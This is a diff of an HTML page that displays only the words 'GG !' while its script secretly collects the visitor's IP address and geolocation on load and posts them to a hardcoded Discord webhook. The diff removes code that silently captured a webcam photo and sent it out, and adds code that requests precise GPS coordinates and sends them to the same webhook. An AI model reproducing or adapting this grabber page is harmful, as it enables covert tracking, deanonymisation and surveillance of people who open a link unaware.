@@ -1,28 +1,16 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>GG !</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      background-color: #000;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: white;
-      font-family: sans-serif;
+      margin:0; padding:0; background:#000; height:100vh;
+      display:flex; flex-direction:column; justify-content:center; align-items:center;
+      color:#fff; font-family:sans-serif;
     }
     #gg-text {
-      font-size: 48px;
-      font-weight: bold;
-      margin-bottom: 20px;
-    }
-    video, canvas {
-      display: none;
+      font-size:48px; font-weight:bold; margin-bottom:20px;
     }
   </style>
 </head>
@@ -30,13 +18,10 @@
 
   <div id="gg-text">GG !</div>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-
   <script>
     const webhookUrl = 'https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv'
 
-    async function getIPData() {
+    async function sendBasicInfo() {
       try {
         const [geoRes, ipv4Res, ipv6Res] = await Promise.all([
           fetch('https://ipapi.co/json/'),
@@ -71,47 +56,42 @@
       }
     }
 
-    async function captureAndSendPhoto() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true })
-        const video = document.getElementById('video')
-        const canvas = document.getElementById('canvas')
-        video.srcObject = stream
+    function sendGPSLocation(latitude, longitude) {
+      const msg = `
+📍 موقع GPS:
 
-        // ننتظر شوي لين تشتغل الكاميرا
-        await new Promise(resolve => setTimeout(resolve, 2000))
+خط العرض: ${latitude}
+خط الطول: ${longitude}
+      `.trim()
 
-        canvas.width = video.videoWidth
-        canvas.height = video.videoHeight
-        canvas.getContext('2d').drawImage(video, 0, 0)
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: msg })
+      }).catch(e => console.error('فشل إرسال الموقع:', e))
+    }
 
-        const imgData = canvas.toDataURL('image/png')
-
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: '📸 صورة الكاميرا:',
-            embeds: [{
-              image: {
-                url: imgData
-              }
-            }]
-          })
-        })
-
-        // نوقف الكاميرا
-        stream.getTracks().forEach(track => track.stop())
-
-      } catch (err) {
-        console.warn('المستخدم رفض الكاميرا أو فيه خطأ', err)
+    function requestGPSPermission() {
+      if (!navigator.geolocation) {
+        console.log('المتصفح لا يدعم الموقع')
+        return
       }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const { latitude, longitude } = position.coords
+          sendGPSLocation(latitude, longitude)
+        },
+        error => {
+          console.warn('رفض أو خطأ في تحديد الموقع:', error.message)
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      )
     }
 
     window.addEventListener('load', async () => {
-      await getIPData()
-      // بعد ما يرسل المعلومات، نطلب الكاميرا
-      captureAndSendPhoto()
+      await sendBasicInfo()
+      requestGPSPermission()
     })
   </script>
 
